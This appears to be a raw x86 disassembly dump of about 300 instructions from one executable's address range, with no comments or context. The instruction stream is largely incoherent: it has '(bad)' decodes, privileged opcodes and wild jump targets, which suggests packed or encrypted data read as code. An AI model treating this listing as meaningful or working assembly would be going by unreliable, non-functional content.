  402270:	mov    esi,0x7f28a2c4
  402275:	cmp    dl,BYTE PTR [ecx-0x35cdf57f]
  40227b:	inc    esi
  40227c:	jg     0x4022b3
  40227e:	adc    bh,BYTE PTR [esp+ebx*2+0x15e044c1]
  402285:	int3   
  402286:	inc    edx
  402287:	loopne 0x40229e
  402289:	mov    ah,0xd5
  40228b:	fist   WORD PTR ds:0x2296e2b4
  402291:	or     bh,BYTE PTR [esi]
  402293:	call   0xe87c3573
  402298:	(bad)  
  40229a:	mov    edi,0x16fadbe7
  40229f:	rcr    BYTE PTR [ebx-0x6],1
  4022a2:	adc    edx,eax
  4022a4:	in     eax,0x6e
  4022a6:	xor    eax,0x843246ec
  4022ab:	lods   eax,DWORD PTR ds:[esi]
  4022ac:	das    
  4022ad:	push   eax
  4022ae:	cmp    ecx,esi
  4022b0:	das    
  4022b1:	push   eax
  4022b2:	cmp    DWORD PTR [esi],edx
  4022b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022b5:	xor    al,0x18
  4022b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022b9:	sub    dh,0x60
  4022bc:	sbb    BYTE PTR [ecx-0x56e77e5b],ch
  4022c2:	mov    ds:0x5ac98cc9,eax
  4022c7:	into   
  4022c8:	mov    ecx,cs
  4022ca:	pop    eax
  4022cb:	push   ss
  4022cc:	add    edx,esp
  4022ce:	xorps  xmm0,XMMWORD PTR [ecx]
  4022d1:	loop   0x4022e0
  4022d3:	lahf   
  4022d4:	jne    0x4022c8
  4022d6:	les    esp,FWORD PTR [ebx-0x143d0d8b]
  4022dc:	jmp    0xea6c9cdb
  4022e1:	cli    
  4022e2:	ja     0x402358
  4022e4:	pop    esi
  4022e5:	sti    
  4022e6:	add    BYTE PTR [esi],dh
  4022e8:	mov    eax,0xdc15ebe
  4022ed:	das    
  4022ee:	fnsave [ebx+0x2c20199f]
  4022f4:	sub    esp,DWORD PTR [edi-0x7a]
  4022f7:	mov    bh,0x29
  4022f9:	jmp    0x4022fc
  4022fb:	adc    BYTE PTR [edx],ch
  4022fd:	pop    edi
  4022fe:	add    dl,BYTE PTR [ecx]
  402300:	lahf   
  402301:	mov    bh,0x8b
  402303:	push   esi
  402304:	(bad)  
  402305:	cmp    al,0x49
  402307:	retf   
  402308:	adc    al,0xc6
  40230a:	lea    eax,[edi]
  40230c:	or     BYTE PTR [bx+0x6707],0x80
  402312:	jne    0x4022c1
  402314:	push   0x6c077380
  402319:	jo     0x40238f
  40231b:	call   DWORD PTR [edi-0xf8b52c8]
  402321:	lods   eax,DWORD PTR ds:[esi]
  402322:	mov    eax,0xb90a6577
  402327:	hlt    
  402328:	shl    DWORD PTR ds:0xff475104,0x76
  40232f:	pop    esp
  402330:	hlt    
  402331:	dec    edi
  402332:	lahf   
  402333:	push   ds
  402334:	dec    edi
  402335:	sti    
  402336:	and    BYTE PTR [eax],cl
  402338:	push   ebx
  402339:	fld    QWORD PTR [ecx]
  40233b:	push   0x16
  40233d:	ds and bh,0x62
  402341:	ds hlt 
  402343:	stc    
  402344:	dec    edx
  402345:	dec    esi
  402346:	repnz stc 
  402348:	dec    edx
  402349:	fldcw  WORD PTR [ebp+0x4e]
  40234c:	rcr    al,1
  40234e:	fist   WORD PTR [ebx+edi*2-0x3f]
  402352:	adc    BYTE PTR [ebp+0x7b],0xc1
  402356:	fistp  WORD PTR [eax]
  402358:	fadd   st(0),st
  40235a:	xor    dl,BYTE PTR [ebp+0x67]
  40235d:	cdq    
  40235e:	mov    ebx,0xfe24b3ca
  402363:	sbb    al,BYTE PTR [esi*2-0x7efbe49c]
  40236a:	bound  ebp,QWORD PTR [esi+0x3]
  40236d:	xlat   BYTE PTR ds:[ebx]
  40236e:	mov    al,ds:0x966253c7
  402373:	mov    ebx,0xbbcc4af8
  402378:	clc    
  402379:	dec    edx
  40237a:	adc    al,BYTE PTR [ebp+0x3d]
  40237d:	outs   dx,DWORD PTR ds:[esi]
  40237e:	xor    al,dl
  402380:	xor    eax,0x3a8d3afd
  402385:	std    
  402386:	cmp    BYTE PTR [ebp-0x72b16162],cl
  40238c:	sahf   
  40238d:	sahf   
  40238e:	xlat   BYTE PTR ds:[ebx]
  40238f:	std    
  402390:	retf   0x3def
  402393:	dec    dl
  402395:	sti    
  402396:	cmp    edx,DWORD PTR [ecx-0x36]
  402399:	push   ecx
  40239a:	jns    0x40237a
  40239c:	(bad)  
  40239d:	or     DWORD PTR [esi],eax
  40239f:	loopne 0x4023c7
  4023a1:	xchg   ebp,eax
  4023a2:	shr    DWORD PTR [ebx+0x1f],cl
  4023a5:	mov    DWORD PTR [esi-0x30],esi
  4023a8:	shl    BYTE PTR [ecx+0x30c0d074],0xb2
  4023af:	cld    
  4023b0:	and    esp,esi
  4023b2:	adc    BYTE PTR [esi+0xe],bh
  4023b5:	adc    eax,0x7d0e7e10
  4023ba:	xor    al,BYTE PTR [eax+0x76637d0e]
  4023c0:	jns    0x40243f
  4023c2:	retf   
  4023c3:	jle    0x40243d
  4023c5:	shl    ebp,cl
  4023c7:	or     DWORD PTR [ecx+0x28],edx
  4023ca:	or     DWORD PTR ss:[edi-0x34b240a4],esp
  4023d1:	js     0x402393
  4023d3:	lea    eax,[edi]
  4023d5:	add    al,0x3e
  4023d7:	dec    esi
  4023d8:	or     BYTE PTR [esp+edi*1],al
  4023db:	ror    eax,cl
  4023dd:	js     0x40241a
  4023df:	sbb    DWORD PTR ds:0x556f38cc,ebx
  4023e5:	push   ecx
  4023e6:	mul    ah
  4023e8:	cmp    ah,BYTE PTR [ebp+0x26533af3]
  4023ee:	mov    ch,0x5f
  4023f0:	push   ebp
  4023f1:	es mov bl,0xe8
  4023f4:	leave  
  4023f5:	dec    edx
  4023f6:	int    0x49
  4023f8:	lea    ebp,[ebx-0x540649cd]
  4023fe:	xor    DWORD PTR [esi],ebx
  402400:	ins    BYTE PTR es:[edi],dx
  402401:	and    BYTE PTR [ebp-0x7e],bl
  402404:	aam    0x8d
  402406:	into   
  402407:	clc    
  402408:	aaa    
  402409:	loop   0x4023d6
  40240b:	dec    esi
  40240c:	cmp    al,0x67
  40240e:	mov    esp,eax
  402410:	inc    esp
  402411:	mov    ebx,0x40451a86
  402416:	inc    esp
  402417:	(bad)  
  402418:	xchg   edx,eax
  402419:	stos   BYTE PTR es:[edi],al
  40241a:	inc    edx
  40241b:	idiv   ebx
  40241d:	sbb    BYTE PTR [ebp+ebx*2-0x31d6809c],dh
  402424:	(bad)  
  402425:	shl    DWORD PTR [edi-0x33],cl
  402428:	sub    al,0xdc
  40242a:	clc    
  40242b:	xchg   ecx,eax
  40242c:	cmp    DWORD PTR [edi-0x1a],esp
  40242f:	loop   0x4023be
  402431:	shl    DWORD PTR [ecx*2-0x5cded86b],1
  402438:	mov    eax,ds:0xf1f76f7f
  40243d:	jmp    0x111a71b6
  402442:	jb     0x402491
  402444:	ficomp DWORD PTR [ebx+0x635b71ac]
  40244a:	mov    esp,0x24635b71
  40244f:	jns    0x402405
  402451:	push   esi
  402452:	mov    al,0x3f
  402455:	sbb    eax,0x16be4e6f
  40245a:	sbb    eax,0xc66f68b7
  40245f:	addr16 sub al,0x1a
  402462:	ret    
  402463:	mov    ebp,0x82447238
  402468:	inc    ebp
  402469:	rol    DWORD PTR ds:0x58a444db,cl
  40246f:	ret    
  402470:	in     al,0xa4
  402472:	push   esi
  402473:	ret    
  402474:	inc    ecx
  402475:	xor    bl,BYTE PTR [ecx-0x640d3acd]
  40247b:	mov    esp,0x19a91709
  402480:	or     dl,BYTE PTR [edi]
  402482:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402483:	sbb    DWORD PTR [edx],ecx
  402485:	pop    ss
  402486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402487:	or     DWORD PTR [edx],0xcd81a317
  40248d:	jge    0x402463
  40248f:	ja     0x4024c5
  402491:	cmp    BYTE PTR [edi],bl
  402493:	rcr    BYTE PTR [edx+0x6b0583e5],cl
  402499:	pop    edx
  40249a:	mov    DWORD PTR [esi-0x7968a2a7],eax
  4024a0:	pop    ecx
  4024a1:	dec    eax
  4024a2:	adc    BYTE PTR [eax+edi*4],0x46
  4024a6:	add    al,0x14
  4024a8:	cmp    BYTE PTR cs:[ebp+0x459e688a],cl
  4024af:	fld    TBYTE PTR [ebp+0x13f9772b]
  4024b5:	(bad)  
  4024b7:	sub    al,0xe4
  4024b9:	dec    esi
  4024ba:	mov    ecx,0x808235f0
  4024bf:	xor    ah,BYTE PTR [ecx+0x44]
  4024c2:	div    BYTE PTR [esi]
  4024c4:	aad    0x46
  4024c6:	fild   QWORD PTR [esi]
  4024c8:	or     DWORD PTR [edi],eax
  4024ca:	loopne 0x4024bc
  4024cc:	jmp    0x4024d1
  4024ce:	aaa    
  4024cf:	mov    ah,0x77
  4024d1:	sbb    DWORD PTR [ebp-0x641683e2],0xf0e97c2e
  4024db:	cwde   
  4024dc:	jl     0x4024c6
  4024de:	inc    ebx
  4024df:	test   eax,0x95c2d907
  4024e4:	or     al,0xda
  4024e6:	rcl    BYTE PTR [ebp-0x65d92969],0x98
  4024ed:	(bad)  
  4024ee:	and    al,0xf1
  4024f0:	jmp    0x4024c7
  4024f2:	ja     0x402505
  4024f4:	push   esi
  4024f5:	(bad)  
  4024f6:	fst    QWORD PTR [ecx-0x42429aa]
  4024fc:	pop    ecx
  4024fd:	inc    eax
  4024fe:	fldenv [ebp+0x5b]
  402501:	test   al,0xd7
  402503:	gs pop ebx
  402505:	sub    BYTE PTR [eiz*2+0x29ab4cb1],ch
  40250c:	mov    dh,0x4d
  40250e:	test   eax,0x37de7929
  402513:	cmp    BYTE PTR [eax-0x51],0x30
  402517:	push   edi
  402518:	sbb    edx,DWORD PTR [ecx]
  40251a:	mov    eax,0x35e1f93
  40251f:	dec    esp
  402520:	iret   
  402521:	sub    bl,dh
  402523:	xchg   DWORD PTR [eax-0x4f],ebp
  402526:	cld    
  402527:	adc    esi,DWORD PTR [ecx-0x757924ed]
  40252d:	das    
  40252e:	mov    ecx,0x529c6943
  402533:	repnz add eax,0x4f161071
  402539:	or     eax,0x24fc83e6
  40253e:	loop   0x40258d
  402540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402541:	stos   BYTE PTR es:[edi],al
  402542:	es mov edx,0x3d2cd441
  402548:	dec    ebp
  402549:	jnp    0x40252e
  40254b:	and    esp,DWORD PTR [esp+edi*2+0x21]
  40254f:	inc    eax
  402550:	gs pop es
  402552:	fimul  DWORD PTR [eax+0x4865cf47]
  402558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402559:	cmc    
  40255a:	gs fninit 
  40255d:	lods   al,BYTE PTR ds:[esi]
  40255e:	arpl   bx,bx
  402560:	jecxz  0x40250e
  402562:	popa   
  402563:	fninit 
  402565:	lods   al,BYTE PTR ds:[esi]
  402566:	pop    edi
  402567:	fninit 
  402569:	lods   al,BYTE PTR ds:[esi]
  40256a:	pop    ebp
  40256b:	fninit 
  40256d:	lods   al,BYTE PTR ds:[esi]
  40256e:	pop    ebx
  40256f:	fninit 
  402571:	lods   al,BYTE PTR ds:[esi]
  402572:	pop    ecx
  402573:	fninit 
  402575:	lods   al,BYTE PTR ds:[esi]
  402576:	push   edi
  402577:	fninit 
  402579:	lods   al,BYTE PTR ds:[esi]
  40257a:	ja     0x4025dd
  40257c:	in     al,0xac
  40257e:	jne    0x402501
  402580:	jmp    0xe9c59931
  402585:	lods   al,BYTE PTR ds:[esi]
  402586:	inc    ecx
  402587:	into   
  402588:	out    dx,eax
  402589:	rol    DWORD PTR [ecx],1
  40258b:	rol    DWORD PTR gs:[ebx-0x31],1
  40258f:	pop    ds
  402590:	sub    cl,BYTE PTR [edi]
  402592:	test   ebp,0x87d7d6d6
  402598:	jecxz  0x40260e
  40259a:	lea    esp,[ecx]
  40259c:	jae    0x402579
  40259e:	sahf   
  40259f:	lods   al,BYTE PTR ds:[esi]
  4025a0:	daa    
  4025a1:	daa    
  4025a2:	cs test al,0x23
  4025a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025a7:	pop    ecx
